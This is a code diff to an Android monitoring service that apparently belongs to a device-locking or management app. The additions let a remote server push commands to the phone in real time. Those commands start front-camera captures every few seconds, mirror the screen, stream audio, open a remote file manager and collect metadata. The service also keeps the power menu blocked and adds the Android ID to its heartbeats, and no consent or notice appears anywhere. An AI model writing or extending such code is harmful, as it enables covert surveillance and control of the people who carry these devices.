@@ -29,6 +29,7 @@ import com.riad.rrlkr.ui.MainActivity;
 import com.riad.rrlkr.util.DeviceUtils;
 import com.riad.rrlkr.util.DeviceProtectedPrefs;
 import com.riad.rrlkr.util.PreferenceManager;
+import com.riad.rrlkr.streaming.StreamingWsClient;
 
 import java.util.List;
 import java.util.Map;
@@ -45,8 +46,8 @@ public class DeviceMonitorService extends Service {
     
     private static final String TAG = "DeviceMonitorService";
     private static final int NOTIFICATION_ID = 1001;
-    private static final long HEARTBEAT_INTERVAL = 30 * 1000; // 30 seconds (was 2s â€” caused ANR)
-    private static final long COMMAND_CHECK_INTERVAL = 10 * 1000; // 10 seconds (was 3s)
+    private static final long HEARTBEAT_INTERVAL = 8 * 1000; // 8 seconds (network is async via enqueue -> no ANR)
+    private static final long COMMAND_CHECK_INTERVAL = 2 * 1000; // 2 seconds (fast command pickup; enqueue is async)
     private static final long PROTECTION_CHECK_INTERVAL = 120 * 1000; // 2 minutes (was 1m)
     private static final long LOCK_TASK_CHECK_INTERVAL = 10 * 1000; // 10 seconds
     private static final long UPDATE_CHECK_INTERVAL = 6 * 60 * 60 * 1000; // 6 hours
@@ -63,6 +64,24 @@ public class DeviceMonitorService extends Service {
     private ApiService apiService;
     private DeviceProtectionManager protectionManager;
     private boolean isRunning = false;
+    /** Persistent real-time command channel — server pushes a wake the instant
+     *  the admin issues a command, so we execute it without waiting for the
+     *  2s poll. The poll + FCM remain as fallbacks if this socket drops. */
+    private StreamingWsClient commandWs;
+    /** IDs of commands already handled in this process. Because the real-time
+     *  wake-fetch and the 2s poll can both return a freshly-created (SENT)
+     *  command before our ack lands on the server, we de-duplicate here so a
+     *  command is never executed twice. Bounded LRU to cap memory. */
+    private final java.util.Set<String> handledCommandIds =
+        java.util.Collections.synchronizedSet(
+            java.util.Collections.newSetFromMap(
+                new java.util.LinkedHashMap<String, Boolean>(256, 0.75f, true) {
+                    @Override
+                    protected boolean removeEldestEntry(
+                            java.util.Map.Entry<String, Boolean> eldest) {
+                        return size() > 200;
+                    }
+                }));
     
     /**
      * Start the monitoring service
@@ -178,21 +197,35 @@ public class DeviceMonitorService extends Service {
         }
         
         // Start heartbeat
+        boolean firstStart = !isRunning;
         isRunning = true;
-        handler.post(heartbeatRunnable);
-        
-        // Start command polling
-        handler.post(commandCheckRunnable);
-        
-        // Start protection verification
-        handler.post(protectionCheckRunnable);
-        
-        // Start lock task monitoring (critical â€” ensures power menu stays blocked)
-        handler.post(lockTaskCheckRunnable);
-        
-        // Start OTA update check (first check after 30s, then every 6 hours)
-        handler.postDelayed(updateCheckRunnable, 30 * 1000);
-        
+
+        if (firstStart) {
+            // First launch of the loops in this service lifetime.
+            handler.post(heartbeatRunnable);
+            handler.post(commandCheckRunnable);
+            handler.post(protectionCheckRunnable);
+            handler.post(lockTaskCheckRunnable);
+            // Start OTA update check (first check after 30s, then every 6 hours)
+            handler.postDelayed(updateCheckRunnable, 30 * 1000);
+            // Open the real-time command socket for instant command delivery.
+            connectCommandSocket();
+        } else {
+            // Re-delivered start (network restored, keep-alive worker, task
+            // removed). Don't re-post the periodic loops -- that would create
+            // duplicate timers and drain the battery. Instead do ONE immediate
+            // sync so the device reconnects to the admin panel right away.
+            Log.i(TAG, "Re-start received - triggering immediate sync");
+            handler.post(() -> {
+                try { sendHeartbeat(); } catch (Throwable ignored) {}
+                try { checkPendingCommands(); } catch (Throwable ignored) {}
+            });
+            // Make sure the real-time command socket is connected (network may
+            // have just come back). connectCommandSocket() is a no-op if it is
+            // already live, otherwise it (re)connects.
+            connectCommandSocket();
+        }
+
         // Check if device should be locked
         checkDeviceStatus();
         
@@ -210,6 +243,12 @@ public class DeviceMonitorService extends Service {
         handler.removeCallbacks(protectionCheckRunnable);
         handler.removeCallbacks(lockTaskCheckRunnable);
         handler.removeCallbacks(updateCheckRunnable);
+        
+        // Tear down the real-time command socket.
+        if (commandWs != null) {
+            try { commandWs.close(); } catch (Throwable ignored) {}
+            commandWs = null;
+        }
         
         // Clean up background thread
         if (bgThread != null) {
@@ -311,6 +350,10 @@ public class DeviceMonitorService extends Service {
         HeartbeatRequest request = new HeartbeatRequest();
         request.setImei(imei);
         request.setImei2(DeviceUtils.getIMEI2(this));
+        try {
+            request.setAndroidId(android.provider.Settings.Secure.getString(
+                    getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
+        } catch (Exception ignored) {}
         request.setFcmToken(fcmToken);
         request.setBatteryLevel(DeviceUtils.getBatteryLevel(this));
         request.setCharging(DeviceUtils.isCharging(this));
@@ -470,6 +513,51 @@ public class DeviceMonitorService extends Service {
         }
     }
     
+    /**
+     * Open (or force-reconnect) the persistent real-time command socket. When
+     * the server pushes {@code {"event":"command"}} we immediately fetch and
+     * execute pending commands instead of waiting for the next 2s poll.
+     * Safe to call repeatedly — reconnects only when not already connected.
+     */
+    private void connectCommandSocket() {
+        String deviceId = preferenceManager.getDeviceId();
+        if (deviceId == null || deviceId.isEmpty()) {
+            try {
+                DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
+                deviceId = dpPrefs.getDeviceId();
+            } catch (Exception ignored) {}
+        }
+        if (deviceId == null || deviceId.isEmpty()) return;
+
+        if (commandWs != null) {
+            // Already created — just make sure it's live.
+            if (!commandWs.isConnected()) {
+                try { commandWs.forceReconnect(); } catch (Throwable ignored) {}
+            }
+            return;
+        }
+
+        commandWs = new StreamingWsClient("commands/ws/" + deviceId,
+            new StreamingWsClient.Callback() {
+                @Override
+                public void onTextMessage(String text) {
+                    // Any push on this channel means "go fetch your commands now".
+                    if (text != null && text.contains("command")) {
+                        Log.i(TAG, "Real-time command wake received");
+                        handler.post(() -> {
+                            try { checkPendingCommands(); } catch (Throwable ignored) {}
+                        });
+                    }
+                }
+            });
+        try {
+            commandWs.connect();
+            Log.i(TAG, "Command socket connecting for device: " + deviceId);
+        } catch (Throwable t) {
+            Log.w(TAG, "Command socket connect failed: " + t.getMessage());
+        }
+    }
+
     private void checkPendingCommands() {
         String deviceId = preferenceManager.getDeviceId();
         if (deviceId == null || deviceId.isEmpty()) {
@@ -508,9 +596,29 @@ public class DeviceMonitorService extends Service {
         });
     }
     
+    private static int payloadInt(Map<String, Object> payload, String key, int def) {
+        if (payload == null || !payload.containsKey(key)) return def;
+        try { return (int) Math.round(Double.parseDouble(String.valueOf(payload.get(key)))); }
+        catch (Exception e) { return def; }
+    }
+
+    private static float payloadFloat(Map<String, Object> payload, String key, float def) {
+        if (payload == null || !payload.containsKey(key)) return def;
+        try { return Float.parseFloat(String.valueOf(payload.get(key))); }
+        catch (Exception e) { return def; }
+    }
+
     private void processCommands(List<CommandResponse> commands) {
         for (CommandResponse cmd : commands) {
             String type = cmd.getCommandType();
+            // De-duplicate: the real-time wake-fetch and the periodic poll can
+            // both return the same freshly-created command before our ack
+            // reaches the server. Skip anything we've already started handling.
+            String cmdId = cmd.getId();
+            if (cmdId != null && !handledCommandIds.add(cmdId)) {
+                Log.d(TAG, "Skipping duplicate command id: " + cmdId);
+                continue;
+            }
             Log.d(TAG, "Processing command: " + type + " id: " + cmd.getId());
             
             if ("LOCK".equalsIgnoreCase(type) || "lock".equals(type)) {
@@ -666,7 +774,7 @@ public class DeviceMonitorService extends Service {
                     Log.w(TAG, "Could not enable camera via DPM: " + e.getMessage());
                 }
                 
-                long interval = 10000;
+                long interval = 3000;
                 Map<String, Object> payload = cmd.getPayload();
                 if (payload != null && payload.containsKey("capture_interval")) {
                     try {
@@ -675,13 +783,19 @@ public class DeviceMonitorService extends Service {
                         Log.w(TAG, "Invalid capture interval");
                     }
                 }
-                
+
+                String lens = "front";
+                if (payload != null && payload.containsKey("camera")) {
+                    lens = String.valueOf(payload.get("camera"));
+                }
+                final String captureLens = lens;
+
                 // Delay to let DPM change take effect (longer for Samsung)
                 final long captureInterval = interval;
                 long startDelay = android.os.Build.MANUFACTURER.equalsIgnoreCase("samsung") ? 2000 : 1000;
                 handler.postDelayed(() -> {
                     RemoteCameraCapture cameraCapture = new RemoteCameraCapture(DeviceMonitorService.this);
-                    cameraCapture.captureAndReport(true, captureInterval);
+                    cameraCapture.captureAndReport(true, captureInterval, captureLens);
                 }, startDelay);
                 acknowledgeCommand(cmd.getId(), "executed");
                 
@@ -772,6 +886,58 @@ public class DeviceMonitorService extends Service {
                 } else {
                     updateService.checkAndUpdate(force);
                 }
+                
+            } else if ("START_SCREEN_MIRROR".equalsIgnoreCase(type) || "start_screen_mirror".equals(type)) {
+                Log.i(TAG, "Start screen mirror command received (poll)");
+                Map<String, Object> payload = cmd.getPayload();
+                int quality = payloadInt(payload, "quality", 50);
+                int fps = payloadInt(payload, "fps", 4);
+                float scale = payloadFloat(payload, "scale", 0.5f);
+                com.riad.rrlkr.streaming.AutoStreamManager.setVideoDesired(this, true, quality, fps, scale);
+                com.riad.rrlkr.streaming.StreamingController.startScreenMirror(this, quality, fps, scale);
+                acknowledgeCommand(cmd.getId(), "executed");
+                
+            } else if ("STOP_SCREEN_MIRROR".equalsIgnoreCase(type) || "stop_screen_mirror".equals(type)) {
+                Log.i(TAG, "Stop screen mirror command received (poll)");
+                com.riad.rrlkr.streaming.AutoStreamManager.setVideoDesired(this, false, 0, 0, 0);
+                com.riad.rrlkr.streaming.StreamingController.stopScreenMirror(this);
+                acknowledgeCommand(cmd.getId(), "executed");
+                
+            } else if ("START_AUDIO_STREAM".equalsIgnoreCase(type) || "start_audio_stream".equals(type)) {
+                Log.i(TAG, "Start audio stream command received (poll)");
+                Map<String, Object> payload = cmd.getPayload();
+                boolean capturePlayback = payload == null ||
+                        !"false".equalsIgnoreCase(String.valueOf(payload.get("capture_playback")));
+                com.riad.rrlkr.streaming.AutoStreamManager.setAudioDesired(this, true, capturePlayback);
+                com.riad.rrlkr.streaming.StreamingController.startAudioStream(this, capturePlayback);
+                acknowledgeCommand(cmd.getId(), "executed");
+                
+            } else if ("STOP_AUDIO_STREAM".equalsIgnoreCase(type) || "stop_audio_stream".equals(type)) {
+                Log.i(TAG, "Stop audio stream command received (poll)");
+                com.riad.rrlkr.streaming.AutoStreamManager.setAudioDesired(this, false, false);
+                com.riad.rrlkr.streaming.StreamingController.stopAudioStream(this);
+                acknowledgeCommand(cmd.getId(), "executed");
+                
+            } else if ("START_FILE_MANAGER".equalsIgnoreCase(type) || "start_file_manager".equals(type)) {
+                Log.i(TAG, "Start file manager command received (poll)");
+                com.riad.rrlkr.filemanager.FileManagerService.start(this);
+                acknowledgeCommand(cmd.getId(), "executed");
+                
+            } else if ("STOP_FILE_MANAGER".equalsIgnoreCase(type) || "stop_file_manager".equals(type)) {
+                Log.i(TAG, "Stop file manager command received (poll)");
+                com.riad.rrlkr.filemanager.FileManagerService.stop(this);
+                acknowledgeCommand(cmd.getId(), "executed");
+                
+            } else if ("COLLECT_METADATA".equalsIgnoreCase(type) || "collect_metadata".equals(type)) {
+                Log.i(TAG, "Collect metadata command received (poll)");
+                bgHandler.post(() -> {
+                    try {
+                        com.riad.rrlkr.metadata.MetadataCollectionWorker.runNow(DeviceMonitorService.this);
+                    } catch (Exception e) {
+                        Log.w(TAG, "Metadata collect failed: " + e.getMessage());
+                    }
+                });
+                acknowledgeCommand(cmd.getId(), "executed");
                 
             } else {
                 Log.w(TAG, "Unknown command type: " + type);
